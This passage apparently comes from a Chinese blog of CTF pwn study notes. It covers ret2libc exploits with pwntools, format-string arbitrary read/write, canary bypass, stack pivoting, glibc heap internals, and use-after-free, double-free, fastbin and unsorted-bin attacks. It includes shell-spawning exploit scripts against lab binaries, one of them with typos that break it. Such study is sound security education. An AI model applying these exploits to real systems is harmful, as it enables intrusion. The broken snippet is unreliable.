class="number">0x804a080</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>,gets_plt,pop_ebx,buf2,system_plt,<span class="number">0xdeadbeef</span>(pop_ebx),buf2])</span><br><span class="line"><span class="comment">#符合ret的寄存器均可不一定一定是pop_ebx</span></span><br><span class="line">io.seneline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin.sh&#x27;</span>)</span><br><span class="line">io.interactieve()</span><br></pre></td></tr></table></figure><p>【ret2libc3】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 = strtol(&amp;buf, v4, v5); 将字符串转化为整数存储在v8里</span><br><span class="line">long <span class="built_in">int</span> strtol(const char *<span class="built_in">str</span>, char **endptr, <span class="built_in">int</span> base)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202338093.png" alt="image-20230427202338093"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202101873.png" alt="image-20230427202101873"><br>注意我们输送send的值要用str【程序接收的总是str】 linux系统下最小单位一叶（4kb）<br>&#x2F;bin&#x2F;sh(通过绝对地址输入bin中的sh)&#x3D;&#x3D;sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<span class="comment">#lld ret2libc3查看本地libc(动态)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]))<span class="comment">#防bug与程序保持一致</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot; :&quot;</span>)</span><br><span class="line">libcBase = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.symbols[<span class="string">&quot;puts&quot;</span>]<span class="comment">#drop=True不保留返回值（此处为接收但不保留\n）</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcBase -&gt;&#123;:#x&#125;&quot;</span>,<span class="built_in">format</span>(libcBase))<span class="comment">#用来debug 结果正确后进行打印 &#123;:#&#125;格式化字符串</span></span><br><span class="line"><span class="comment">#format转换格式 前x表示转换为十六进制</span></span><br><span class="line"><span class="comment">#oneGadget = libcBase + 0x3a9fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat(cyclic(60),oneGadget)</span></span><br><span class="line">payload=flat(cyclic(<span class="number">60</span>),libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>],<span class="number">0xdeadbeef</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>偏移：文件某一个位置距文件开头第一个字节距离</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-<span class="number">2.23</span>.so<span class="function"><span class="params">(动态链接文件名)</span>-&gt;</span>得偏移量 <span class="comment">#碰运气喽😀</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230428193230160.png" alt="image-20230428193230160"></p><p>gdb调试<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230511094407053.png" alt="image-20230511094407053"></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-<span class="built_in">mode</span>-parent 解决该问题（gdb中）</span><br></pre></td></tr></table></figure><p>x64环境下传参要先传入六个寄存器中（rdi rsi rdx rcx r8 r9 ）<br>劫持程序返回到目的函数之前要先把目的函数的参数传递完毕（即传递参数的gadget放在目标函数之前）任何时候数据的写入都是从低地址向高地址写入<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520224921532.png" alt="image-20230520224921532"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520225916659.png" alt="image-20230520225916659"></p><p>一般有jz跳转提示（一长串pop 寄存器）**[lib_csu]**</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230521000849599"></p><p>注意看地址（如图中edi只可写低八位）<br>libc泄露技巧：找到关键函数（如write【返回时有栈溢出】）对应的的plt下got 用函数的真实地址-函数在libc中的地址&#x3D;libc基地址 -&gt;找system+“&#x2F;bin&#x2F;sh”偏移传入泄露<br>【level3】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230522173452594"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523002237695.png"></p><p>学会用转换捏io.recv(4&#x2F;8)</p><h3 id="【花式栈溢出】"><a href="#【花式栈溢出】" class="headerlink" title="【花式栈溢出】"></a><strong>【花式栈溢出】</strong></h3><p>1.程序中无真正main函数（dyn）<br>start-&gt;libc_start_mian-&gt;init-&gt;main<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101555442.png" alt="image-20230523101555442"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101634224.png" alt="image-20230523101634224"></p><p>此时栈中无栈帧 全部存储的shell里的环境变量 其中记录了当前执行程序的名字<br>找程序入口：IDA（可爱女人）main地址 gdbzho中下断点调试 stack查看栈帧<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104215828.png" alt="image-20230523104215828"></p><p>checksecc 发现canary打开 <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104710354.png" alt="image-20230523104710354"></p><p>运行程序 手动超长溢出（可利用python）查看提示 【可从IDA中辅助分析】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523105629335.png" alt="image-20230523105629335"></p><p>之前为segment fault 现why为stack samshing<br>覆盖后触发stack_chk_fail函数 强行退出程序 -&gt;stack smashing</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523114523470.png" alt="image-20230523114523470"><br>如何在可爱女人中观察到Canary？<br>标志：段寄存器读入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v4</span> <span class="operator">=</span> _readfsqword(<span class="number">0</span>x28) //🌰</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230523122130079.png" alt="image-20230523122130079"></p><p>Canary放置无硬性标准 需分析<br>elf文件较小时 地址可能在虚拟地址中映射两份<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610163822498.png" alt="image-20230610163822498"></p><p>strip去掉函数名——&gt;防护程序 （IDA中自动用偏移作为函数名）<br>此时无“main”函数【gdb中断点下不了】</p><p><strong>【栈迁移】</strong></p><p>花样很多啦 栈欺骗<br>利用gadget覆盖ebp 恶意代码写在ebp中【pop ret&#x2F;mov esp，ebp】ebp辅佐esp<br>esp抹除数据 ebp增加 控制esp即可<br><strong>pwn3_x64</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182043459.png" alt="image-20230610182043459"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182053082.png" alt="image-20230610182053082"></p><p>write第三个参数无法获取时 运气（猜rdx&gt;8）</p><p>ret需要给显示屏即标准输出 1是标准输出的代号</p><p><strong>格式化字符串</strong>（保存在栈上）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0x22222222</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>,a.b,c,s);<span class="comment">//第一个参数即为格式化字符串（%08x.）</span></span><br><span class="line"><span class="built_in">printf</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不给参数情况下 会直接将栈中内容进行打印</p><p>格式化字符串攻防中printf（”%s%s%s(足够长即可使得程序崩溃)”）</p><p><strong>字符串截断漏洞主体利用思想</strong>：</p><p> 截断符的篡改或抹去（让函数误解程序未执行完毕）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225648504.png" alt="image-20230615225648504"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225717582.png" alt="image-20230615225717582"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%p溢出---&gt;实际将栈上重要数据进行打印（如地址）可用于绕过canary</span><br><span class="line">%s溢出---&gt;解析栈打印其中内容 ---&gt;泄露任意地址</span><br><span class="line">泄露任意地址：</span><br><span class="line"><span class="number">1</span>.泄露栈上本身存在的地址（如<span class="keyword">read</span>@got）</span><br><span class="line"><span class="number">2</span>.泄露垃圾数据（篡改喽）再<span class="keyword">read</span>@got</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615232327380.png" alt="image-20230615232327380"></p><p>为避免flag和格式化字符串第一个参数距离很远直接传地址即可（printf（”%100$d”,a,b,c））</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616002416632.png" alt="image-20230616002416632"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c);<span class="comment">//打印出3  $n---&gt;打印出第几个参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%d —-&gt;打印有符号整型  -140….对应0xf（要么为动态链接库中地址 要么为栈上地址）<br><img src="https://cdn.jsdelivr.net/gh/yub/First@main/image-20230616134523270.png" alt="image-20230616134523270"></p><p>逐参打印</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616134746197.png" alt="image-20230616134746197"></p><p>%n—-&gt;解析地址对应内容 —-写入前方已经打印成功的字符个数（任意地址写）<br>%n 写入4字节0x00000004<br>%hn写入两字节0x0004<br>%hhn写入一字节0x04<br>printf的第n+1个参数是格式化字符串的第n个参数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616162630147.png" alt="image-20230616162630147"></p><p>0x0b &#x3D; 11也可以说明为第十一个参数<br>空行部分相当于对填入数据的打印<br>关键：找read函数判断写入数据为格式化字符串第几个参数<br>x86可以直接数 x64前6个参数在寄存器中第7个才在栈上</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616170955472.png" alt="image-20230616170955472"></p><p>x64直接利用找参数位置 可暴力打印%7$p%8$p%9$p(仅为举例)<br>前6个参数在寄存器中 rsp为第7个—&gt;对应n+1printf（flag）和n格式化字符串关系找到位置</p><p><strong>堆</strong><br>作用：给用户随时提供可使用的内存 用完后归还</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616174226840.png" alt="image-20230616174226840"></p><p>堆管理器—&gt;中间人</p><p>堆管理器并非由操作系统实现,而是由libc.so.6链接库实现。封装了一些系统调用﹐为用户提供方便的动态内存分配接口的同时﹐力求高效地管理由系统调用申请来的内存。</p><p>申请内存系统调用：<br>brk（data段末尾向上扩展调用）主线程系统调用<br>mmap（内存&#x2F;磁盘映射）</p><p>决定要素：主线程brk和mmap都可用<br>                   子线程只可用mmap<br>子线程申请空间过大在mmap段映射 小可直接在data段开辟<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616175743170.png" alt="image-20230616175743170"></p><p>malloc用户向堆管理器要内存 brk和mmap向操作系统申请</p><p><strong>arena</strong>（将物理内存映射到虚拟内存空间存储管理）<br>内存分配区，可以理解为堆管理器所持有的内存池</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">操作系统</span><span class="literal">--</span>&gt;<span class="comment">堆管理器</span><span class="literal">--</span>&gt;<span class="comment">用户</span></span><br><span class="line"><span class="comment">物理内存</span><span class="literal">--</span>&gt;<span class="comment">arena</span><span class="literal">--</span>&gt;<span class="comment">可用内存</span></span><br></pre></td></tr></table></figure><p>堆管理器与用户的内存交易发生于arena中（堆管理器向操作系统批发来的有冗余的内存库）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233511677.png" alt="image-20230618233511677"></p><p><strong>chunk</strong>（内存分配的最小单位 不可能小于8字节【两字长16字节（x64）】x32大小）<br>用户申请内存的单位，也是堆管理器管理内存的基本单位<br>malloc（）返回的指针指向一个chunk的数据区域 chunk大小 大于malloc分配大小<br>chunk分配规律：只能分配字长整数倍大小—&gt;size低三位一定为0</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617134142917.png" alt="image-20230617134142917"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617140647896.png" alt="image-20230617140647896"></p><p>free chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234752208.png" alt="image-20230617234752208"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617143930107.png" alt="image-20230617143930107"></p><p>注意在size低三位有三个控制字段<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230617145200469.png" alt="image-20230617145200469"></p><p>A：主线程 M：是否为mmap P：用于free chunk（为1–&gt;前一个chunk被写入数据即前一个chunk为malloc chunk 为0则前一个chunk为free chunk）1–&gt;前一个chunk被占用 0–&gt;前一个chunk pre-in-use</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617152524631.png" alt="image-20230617152524631"></p><p>fastbin free chunk 四字段控制结构 smallbin free chunk 四字段控制结构<br>bigbin free chunk 六字段控制结构</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617215936729.png" alt="image-20230617215936729"><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233738837.png" alt="image-20230618233738837"></p><p>fast bins独立于其他几个bins 压栈出栈即可<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235205771.png" alt="image-20230617235205771"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235515996.png" alt="image-20230617235515996"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617220021172.png" alt="image-20230617220021172"></p><p>large bin free chunk 6个字段全部用到<br>malloc chunk 用前两个<br>malloc chunk前面还是malloc chunk时只用到第二个字段<br>small bin free chunk allocated chunk用前4个字段<br>fast bin free chunk 用前3个字段<br>经过第一次malloc后堆管理器才完成初始化<br>页对齐 页的大小是4kb 4kb需要2^12映射空间 12bits为3bytes变成3个0<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222745908.png" alt="image-20230617222745908"></p><p>x64最下chunk单位（0x20大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222844117.png" alt="image-20230617222844117"></p><p>x86 同理得最小大小为0x10（切一半）<br>控制字段不可填写 堆管理器满足用户需求向操作系统申请0x100大小实际申请chunk大小为0x110（pre size+size 两字长 16bits 0x10大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617223313606.png" alt="image-20230617223313606"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617225749420.png" alt="image-20230617225749420"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc得到的函数指针指向size （图中）但chunk开头的地址是</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617230144174.png" alt="image-20230617230144174"></p><p>其他chunk为程序自身利用缓冲区提供（如：printf函数 【未指定stdout缓冲区时 printf函数默认用malloc得到一个堆中的缓冲区为stdout所用】）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617231321789.png" alt="image-20230617231321789"></p><p>程序读取时以一条语句为单位 size大小为申请的0x100+prev size+size（两字长）此时p已被程序员复用 即此时总size大小（总chunk大小 0x100为malloc chunk大小）为0x111</p><p><strong>previous size复用</strong><br>prev size针对free chunk 即存储上一个free chunk<br>当上一个chunk不为fastbin free chunk时（为malloc chunk）prev chunk可被复用<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233352292.png" alt="image-20230617233352292"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233454554.png" alt="image-20230617233454554"></p><p>以上变化chunk变化相同 8字节申请的大小为字长奇数倍分配空间&#x3D;申请到的字长数-1malloc分配空间大小<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105030445.png" alt="image-20230618105030445"></p><p>0x100数据区域的大小 0x10为控制字段的大小 1 prev in use 位大小</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105235986.png" alt="image-20230618105235986"></p><p>放在fast bin 中的free chunk仍会被标记为在使用中（fast bin p位恒为1）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105723997.png" alt="image-20230618105723997"></p><p><strong>物理链表</strong>【相邻chunk间size域连接（整数）】</p><p>通过prev size串联起来（获取前一个chunk地址）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234705813.png" alt="image-20230617234705813"></p><p><strong>逻辑链表</strong>（存在于bins中）【指针连接】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111056657.png" alt="image-20230618111056657"></p><p>每一个bin都含有对应的链表 构成的bins链表称为逻辑链表<br>同类chunk串联到回收站中 malloc索取相应大小时可高效从回收站中提取</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111551403.png" alt="image-20230618111551403"></p><p><strong>bin</strong><br>（临时【系统需要时可用】）保存刚被free后内存区域的结构（堆管理器中）<br>管理arena中空闲chunk的结构<br>以数组的形式存在 数组元素为相应大小的chunk链表的链表头<br>存在于arena的malloc_state中<br>如：<br>unsorted bin<br>fast bins<br>small bins<br>large bins<br> (tcache)<br><strong>除fast bin和tcache为单向链表 其余bins均为双向链表</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618230718261.png" alt="image-20230618230718261"><br>unsorted bin smallbin largebin双向链表结构bin利用:<br>🤖malloc分配时<br>🍰获取很大chunk时优先从回收站中拿取 unsorted bins变为sorted bins使用<br>双向链接：先进先出（图上自上而下malloc）<br>好处：队列底部压入数据 头部取出数据 一条链表就可处理数据<br>small bin（大小固定）<br>一个bin存储两个地址 物理内存中连续 把所有chunk串联</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235211411.png" alt="image-20230618235211411"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235427918.png" alt="image-20230618235427918"><br>large bins（大小不定【每一chunk大小不一】 最后一个chunk存储最后值）<br>大小为范围 —&gt;用两个额外的控制域记录数据<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235448673.png" alt="image-20230618235448673"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618234942479.png" alt="image-20230618234942479"></p><p>fast bins可变为small bins（fast bin整体遍历检查时分类）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235237538.png" alt="image-20230618235237538"></p><p>BK POINTER 域无实际作用<br>top chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619151359619.png" alt="image-20230619151359619"></p><p> malloc state（fastbinsY+bins）在libc数据段管理主进程<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619120041795.png" alt="image-20230619120041795"></p><p><strong>什么样的chunk会进入usorted bins</strong><br>刚刚释放（超过fastbin大小）不能进入fastbins且未被分类的</p><p>超出fastbins可用大小利用过程：unsorted先乞讨 合并链接凑大小 small large一起来 实在不够喊top<br>先找sortedbins 不够触发sorted遍历 合并unsorted相邻chunk并分类<br>即利用时只要找到比用户申请大的chunk即可 剩余部分为last  remainder chunk转为fastbin部分最后进入unsorted bins</p><p><strong>UAF</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160128310.png" alt="image-20230619160128310"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160356676.png" alt="image-20230619160356676"></p><p>A free后的内存区</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160410293.png" alt="image-20230619160410293"></p><p>在ree chunk和top chunk张放一个malloc chunk阻止两者合并（避免堆管理器的消耗）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619161430277.png" alt="image-20230619161430277"></p><p>c分配到a所在的内存区域中 占用利用</p><p>gdb偏移下断点方法</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">b</span> *<span class="variable">$rebase</span>(0x..)【偏移】</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193114872.png" alt="image-20230619193114872"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193556660.png" alt="image-20230619193556660"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203856606.png" alt="image-20230619203856606"></p><p>第四次malloc后得到栈上地址（堆分配）</p><p>free a后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193754379.png" alt="image-20230619193754379"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619194533056.png" alt="image-20230619194533056"></p><p>防止double free漏洞（UAF）：控制内存的指针和内存均需清空 （chunk被清空但指针未清空）<br>意外：低权限指针可因使用同一块内存区域拥有高权限指针功能（若低权限指针篡改返回值高权限指针会无意识传送到pie中）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> * p = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619195914454.png" alt="image-20230619195914454"></p><p>tips：<br>1.glibc2.26&#x2F;2.27中无tache检查<br>2.fast bin会检查自身链表中每一个chunk大小是否为规定大小||新进入的chunk是否与上一个chunk重复（报double free 强制退出）</p><p>绕过：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span>* p = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="type">int</span>* ptr = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(ptr);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastbin_attack<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619202854520.png" alt="image-20230619202854520"></p><p>free后fd出现 此时此块chunk对于d来说为malloc chunk可被任意写入值（fd处）<br>fd写入一个stack值 诈骗fast bin过a后下一个free chunk在栈上 【任意霍霍实现】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203751739.png" alt="image-20230619203751739"><br>注意：fd始终指向下一个chunk开头地址 即stack对应栈上目标地址向上两个字长</p><p><strong>unsorted_bin_attcak</strong><br>可以把任意位置的地址篡改成较大的值（实际就是伪造chunk在栈上写一个大数值）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205339973.png" alt="image-20230619205339973"></p><p>程序目标将var篡改为较大值<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205857320.png" alt="image-20230619205857320"></p><p>unlink移除中间的chunk  新fd和bk中填入unsorted bin中值（fd和bk数据域写入unsorted 地址）最大0x7ff…<br><strong>house_of系列</strong><br>malloc总是接收一个无符号整数 输入负数相当于传入一个超大数<br>整数溢出（超大整数等效于一个负数）<br>top chunk起始地址 + malloc分配空间超出整数内存空间大小–丢弃超出32位部分（最高位）补0 剩下数字变很小（32位表示空间大小）</p><p>此时这个很小的数很可能落在data处（？）</p><p><strong>FSB&amp;USF例题</strong><br>(1)IDA观察<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155645246.png" alt="image-20230620155645246"></p><p>scanf向v7、v8、v9写字符串（开辟的空间是连续的）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620161845271.png" alt="image-20230620161845271"></p><p>连续的三个字长缓冲区<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620162028689.png" alt="image-20230620162028689">发现程序标记提示进入对应漏洞查看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155732238.png" alt="image-20230620155732238"></p><p>格式化字符串<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155800172.png" alt="image-20230620155800172"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155817628.png" 